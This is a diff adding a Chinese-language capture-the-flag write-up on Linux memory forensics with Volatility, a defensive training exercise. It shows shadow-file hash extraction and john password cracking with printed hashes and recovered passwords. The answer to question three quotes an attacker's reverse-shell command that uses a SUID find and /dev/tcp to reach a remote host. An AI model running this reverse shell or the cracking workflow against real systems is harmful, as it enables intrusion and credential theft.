@@ -1284,3 +1284,329 @@ vol2 -f ... --profile=... linux_mount_cache [options]
 
 
 
+## Windows
+
+
+
+## 题目
+
+### Linux内存取证
+
+导入 Profile，将文件 **ubuntu18.zip** 导入到 **volatility/plugins/overlays/linux** 文件夹中，并使用 **vol2 --info** 验证。
+
+```
+vol2 --info
+
+Profiles
+--------
+Linuxubuntu18x64      - A Profile for Linux ubuntu18 x64
+...
+```
+
+
+
+**一、请提交用户目录下压缩包中 flag.txt 文件内容**
+
+导出内存中的所有文件路径，保存到 file 文件中。
+
+```
+vol2 -f linux --profile=Linuxubuntu18x64 linux_find_file -L > file
+```
+
+
+
+过滤 file 文件中的内容，使用关键字 **/home/** 和 **zip**。
+
+```
+cat file | grep /home/ | grep zip
+
+----------------                0x0 /home/hil/unzip
+         3670125 0xffff90ed83f58978 /home/hil/flag.zip
+```
+
+
+
+将文件从内存文件中导出到本地磁盘。
+
+```
+vol2 -f linux --profile=Linuxubuntu18x64 linux_find_file -i 0xffff90ed83f58978 -O flag.zip
+```
+
+```
+file flag.zip
+
+flag.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
+```
+
+
+
+尝试进行解压，提示需要密码。
+
+```
+unzip flag.zip 
+
+Archive:  flag.zip
+[flag.zip] flag.txt password: 
+```
+
+
+
+使用 crunch 工具生成 8 位纯数字密码全部组合的字典。
+
+```
+crunch  8 8 -t %%%%%%%% > passwd.txt
+
+858 MB
+0 GB
+0 TB
+0 PB
+Crunch will now generate the following number of lines: 100000000 
+```
+
+
+
+使用 zip2john 工具提取压缩包的 hash 值到文件中。
+
+```
+zip2john flag.zip > hash.txt
+```
+
+
+
+通过 john 工具，使用生成的密码字典进行爆破，获得压缩包密码（**20230309**）
+
+```
+john --wordlist=passwd.txt hash.txt
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 8 OpenMP threads
+Note: Passwords longer than 21 [worst case UTF-8] to 63 [ASCII] rejected
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+20230309         (flag.zip/flag.txt)     
+1g 0:00:00:01 DONE (2025-03-11 14:30) 0.7519g/s 15213Kp/s 15213Kc/s 15213KC/s 20217856..20234239
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+
+
+使用密码解压压缩包，获取 flag.txt 中的值。
+
+```
+unzip flag.zip 
+
+Archive:  flag.zip
+[flag.zip] flag.txt password: 
+  inflating: flag.txt
+```
+
+```
+cat flag.txt
+
+flag{welcome_y3h8aq2}
+```
+
+
+
+答案：**flag{welcome_y3h8aq2}**
+
+
+
+**二、请提交 root 用户的登录密码**
+
+获取 root 用户的密码，一般情况下都是获取 **/etc/shadow** 文件中 root 密码的 hash 值，并使用字典进行爆破。
+
+
+
+获取 root 密码的 hash 值的方式有很多中，/etc/shadow 文件几乎 100% 会被明文加载到内存中，最简单的方式是使用 strings 命令输出整个内存文件中的字符串，并根据 /etc/shadow 文件存储内容的结构，使用正则表达式进行过滤。
+
+```
+strings linux | grep -e "root:.*:::"
+
+root:$6$j/e.vUPt$pRNuWlw5UX8mQ9QybQBgRKDhQvKBcR3QkdCOlhRvlLuuISpEpQMJQJr1pXtKS390Mgj7E2tTFW1kizq79wiRr.:19608:0:99999:7:::
+root:$6$j/e.vUPt$pRNuWlw5UX8mQ9QybQBgRKDhQvKBcR3QkdCOlhRvlLuuISpEpQMJQJr1pXtKS390Mgj7E2tTFW1kizq79wiRr.:19608:0:99999:7:::
+root:$6$j/e.vUPt$pRNuWlw5UX8mQ9QybQBgRKDhQvKBcR3QkdCOlhRvlLuuISpEpQMJQJr1pXtKS390Mgj7E2tTFW1kizq79wiRr.:19608:0:99999:7:::
+root:$6$j/e.vUPt$pRNuWlw5UX8mQ9QybQBgRKDhQvKBcR3QkdCOlhRvlLuuISpEpQMJQJr1pXtKS390Mgj7E2tTFW1kizq79wiRr.:19608:0:99999:7:::
+```
+
+
+
+刚才使用 **linux_find_file** 插件获取了内存中所有文件位置，使用 **/etc/shadow** 关键字进行过滤，获取 **INODE**，然后从内存中导出 **/etc/shadow** 文件。
+
+```
+cat file | grep /etc/shadow
+
+          262337 0xffff90ed83070530 /etc/shadow-
+          263668 0xffff90ee35c14568 /etc/shadow
+```
+
+```
+vol2 -f linux --profile=Linuxubuntu18x64 linux_find_file -i 0xffff90ee35c14568 -O shadow
+```
+
+```
+cat shadow
+
+root:$6$j/e.vUPt$pRNuWlw5UX8mQ9QybQBgRKDhQvKBcR3QkdCOlhRvlLuuISpEpQMJQJr1pXtKS390Mgj7E2tTFW1kizq79wiRr.:19608:0:99999:7:::
+daemon:*:18885:0:99999:7:::
+bin:*:18885:0:99999:7:::
+sys:*:18885:0:99999:7:::
+sync:*:18885:0:99999:7:::
+games:*:18885:0:99999:7:::
+man:*:18885:0:99999:7:::
+lp:*:18885:0:99999:7:::
+mail:*:18885:0:99999:7:::
+news:*:18885:0:99999:7:::
+uucp:*:18885:0:99999:7:::
+proxy:*:18885:0:99999:7:::
+www-data:*:18885:0:99999:7:::
+backup:*:18885:0:99999:7:::
+list:*:18885:0:99999:7:::
+irc:*:18885:0:99999:7:::
+gnats:*:18885:0:99999:7:::
+nobody:*:18885:0:99999:7:::
+systemd-network:*:18885:0:99999:7:::
+systemd-resolve:*:18885:0:99999:7:::
+syslog:*:18885:0:99999:7:::
+messagebus:*:18885:0:99999:7:::
+_apt:*:18885:0:99999:7:::
+uuidd:*:18885:0:99999:7:::
+avahi-autoipd:*:18885:0:99999:7:::
+usbmux:*:18885:0:99999:7:::
+dnsmasq:*:18885:0:99999:7:::
+rtkit:*:18885:0:99999:7:::
+cups-pk-helper:*:18885:0:99999:7:::
+speech-dispatcher:!:18885:0:99999:7:::
+whoopsie:*:18885:0:99999:7:::
+kernoops:*:18885:0:99999:7:::
+saned:*:18885:0:99999:7:::
+avahi:*:18885:0:99999:7:::
+colord:*:18885:0:99999:7:::
+hplip:*:18885:0:99999:7:::
+geoclue:*:18885:0:99999:7:::
+pulse:*:18885:0:99999:7:::
+gnome-initial-setup:*:18885:0:99999:7:::
+gdm:*:18885:0:99999:7:::
+hil:$6$F1jR4mYh$/tNxOqY2kmxTEo1yBHcSRpaJKj164FAjgW0KIOyu3.AY9.t0sZri5/8/LnDxQTU/Cj3z68kIZy8FhCoYlBs4o.:19581:0:99999:7:::
+sshd:*:19581:0:99999:7:::
+```
+
+
+
+将 root 用户的信息复制到一个单独的文件中，使用 rockyou 字典进行爆破。
+
+```
+john --wordlist=rockyou.txt root_pass
+```
+
+```
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 8 OpenMP threads
+Note: Passwords longer than 26 [worst case UTF-8] to 79 [ASCII] rejected
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+ABCabc123        (root)     
+1g 0:00:00:04 DONE (2025-03-11 15:05) 0.2024g/s 10986p/s 10986c/s 10986C/s sooty123..250895
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+
+
+答案：**ABCabc123**
+
+
+
+**三、请指出攻击者使用什么命令实现提权操作**
+
+使用 linux_bash 插件导出执行的命令
+
+```
+vol2 -f linux --profile=Linuxubuntu18x64 linux_bash
+```
+
+```
+Volatility Foundation Volatility Framework 2.6.1
+Pid      Name                 Command Time                   Command
+-------- -------------------- ------------------------------ -------
+    1831 bash                 2023-09-08 03:14:52 UTC+0000   find / -perm -4000 -exec ls -la {} \; 2>/dev/null 
+    1831 bash                 2023-09-08 03:14:52 UTC+0000   0
+    1831 bash                 2023-09-08 03:15:05 UTC+0000   sudo su
+    1831 bash                 2023-09-08 03:15:29 UTC+0000   find /etc/passwd -exec bash -ip >& /dev/tcp/192.168.29.129/7777 0>&1 \;
+    2020 bash                 2023-09-08 03:15:33 UTC+0000   whoami
+    2020 bash                 2023-09-08 03:15:35 UTC+0000   cat /etc/shadow
+    2020 bash                 2023-09-08 03:16:01 UTC+0000   cp /etc/shadow /home/hil/
+    2020 bash                 2023-09-08 03:16:07 UTC+0000   cat /home/hil/shadow
+    2093 bash                 2023-09-08 03:16:30 UTC+0000   USER=root
+    2093 bash                 2023-09-08 03:16:30 UTC+0000   ls
+    2093 bash                 2023-09-08 03:16:48 UTC+0000   nohup python3 powershell.py &
+    2093 bash                 2023-09-08 03:16:59 UTC+0000   vim powershell.py 
+    2093 bash                 2023-09-08 03:17:14 UTC+0000   nohup python3 powershell.py &
+    2093 bash                 2023-09-08 03:17:25 UTC+0000   ls
+    2093 bash                 2023-09-08 03:17:37 UTC+0000   USER=root
+    2093 bash                 2023-09-08 03:17:37 UTC+0000   ls
+    2093 bash                 2023-09-08 03:17:37 UTC+0000   cd /home/hil/
+    2093 bash                 2023-09-08 03:17:44 UTC+0000   nano shadow 
+    2093 bash                 2023-09-08 03:17:44 UTC+0000   s
+    2196 bash                 2023-09-08 03:18:00 UTC+0000   USER=root
+    2196 bash                 2023-09-08 03:18:00 UTC+0000   ls
+    2196 bash                 2023-09-08 03:18:02 UTC+0000   cd /home/hil/
+    2196 bash                 2023-09-08 03:18:03 UTC+0000   ls
+    2196 bash                 2023-09-08 03:18:05 UTC+0000   unzip flag.zip 
+    2196 bash                 2023-09-08 03:18:05 UTC+0000   ???B6V
+    2288 bash                 2023-09-08 03:18:26 UTC+0000   cd linux_memory/
+    2288 bash                 2023-09-08 03:18:30 UTC+0000   ./lmg -y
+```
+
+
+
+答案：**find /etc/passwd -exec bash -ip >& /dev/tcp/192.168.29.129/7777 0>&1 \;**
+
+
+
+**四、请指出内存中恶意进程的 PID**
+
+在 **linux_bash** 插件输出的结果中发现 **nohup python3 powershell.py &**，使用 pslist 查看进程 ID。
+
+```
+vol2 -f linux --profile=Linuxubuntu18x64 linux_pslist | grep powershell
+```
+
+```
+0xffff90edaf8445c0 powershell           2132            2093            0               0      0x0000000061efe000 2023-09-08 03:17:27 UTC+0000
+```
+
+
+
+答案：**2132**
+
+
+
+**五、请指出恶意进程加密文件后的文件类型**
+
+查看恶意进程有哪些子进程。
+
+```
+vol2 -f linux --profile=Linuxubuntu18x64 linux_pstree -p 2132
+```
+
+```
+Name                 Pid             Uid            
+powershell           2132                           
+.gpg                 2368                           
+```
+
+
+
+使用 linux_psaux 查看启动进程时使用的详细参数。
+
+```
+Pid    Uid    Gid    Arguments                                                       
+2132   0      0      powershell                                                      
+2368   0      0      gpg --output wlaq.txt.gpg --encrypt --recipient chinaskills@163.com wlaq.txt
+```
+
+
+
+答案：gpg
